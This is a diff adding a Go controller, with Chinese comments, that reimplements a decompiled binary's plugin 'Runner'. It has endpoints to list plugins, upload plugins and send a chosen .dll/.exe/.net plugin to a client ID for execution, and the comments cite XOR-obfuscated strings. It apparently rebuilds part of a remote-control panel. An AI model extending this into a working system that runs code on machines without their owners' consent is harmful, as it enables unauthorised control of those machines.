@@ -1,0 +1,85 @@
+// Package controllers — 插件(Runner)控制器，1:1 对齐原版二进制。
+//
+// 真实方法（funcnametab + 反编译地址）与前端路由：
+//
+//	List       0x18ed8a0   GET  /runner/list       插件列表
+//	RunPlugin  0x18edd80   POST /runner/runplugin  下发插件执行
+//	Upload     0x18eeb00   POST /runner/upload     上传插件
+//
+// 反编译参数集：
+//
+//	List:      id / name
+//	RunPlugin: id / name（插件名，按 .dll/.exe/.net 及 amd64 架构选择平台插件）
+//	Upload:    file
+package controllers
+
+import (
+	"os"
+	"strings"
+)
+
+// RunnerController 管理插件（runner）列表与下发。
+type RunnerController struct {
+	ApiBaseController
+}
+
+// List 返回服务器插件列表（GET /runner/list）。
+// 反编译（0x18ed8a0）：目录 "./plugins"（9B XOR 数组 81 72 55 89 f3 85 0e d8 18
+// ^ af 5d 25 e5 86 e2 67 b6 6b）经 FUN_005e8cc0 ReadDir；响应 = [{id: 下标,
+// name: 条目名}]（FUN_00412ae0 建图，键 DAT_01bd6866="id" / DAT_01bd7df9="name"），
+// JsonOkResult 直接返回列表（无 "plugins" 包装键）。
+func (c *RunnerController) List() {
+	plugins := engineListPlugins()
+	c.JsonOkResult(plugins)
+}
+
+// RunPlugin 下发插件到客户端执行（POST /runner/runplugin）。
+// 反编译（0x18edd80）参数：id（客户端）/ name（插件名）；原版按
+// .dll / .exe / .net 后缀与 amd64 架构选取对应平台的插件二进制下发。
+func (c *RunnerController) RunPlugin() {
+	id := int64(c.JsonGetInt("id"))
+	name := c.JsonGetStr("name")
+	if id == 0 || name == "" {
+		c.JsonErr("id and name required")
+		return
+	}
+	lower := strings.ToLower(name)
+	// 原版按扩展名选择插件类型（RunPlugin 反编译字符串：.dll / .exe / .net）
+	_ = lower
+	dispatchCmd(id, "runplugin "+name)
+	c.JsonOkMessage("ok")
+}
+
+// Upload 上传插件（POST /runner/upload）。参数：file。
+func (c *RunnerController) Upload() {
+	file, _, err := c.GetFile("file")
+	if err != nil {
+		c.JsonErr("upload failed: " + err.Error())
+		return
+	}
+	defer file.Close()
+	engineSavePlugin(file)
+	c.JsonOkMessage("ok")
+}
+
+// ---- 引擎阶段对齐 ----
+
+func engineListPlugins() []map[string]interface{} {
+	// 反编译：FUN_005e8cc0("./plugins") 读目录，逐项 {id: 下标, name: 名称}
+	entries, err := os.ReadDir("./plugins")
+	if err != nil {
+		return []map[string]interface{}{}
+	}
+	list := make([]map[string]interface{}, 0, len(entries))
+	for i, e := range entries {
+		list = append(list, map[string]interface{}{
+			"id":   i,
+			"name": e.Name(),
+		})
+	}
+	return list
+}
+
+func engineSavePlugin(f interface{ Close() error }) {
+	// TODO(engine): 对齐插件保存（RunnerController.Upload 反编译）
+}
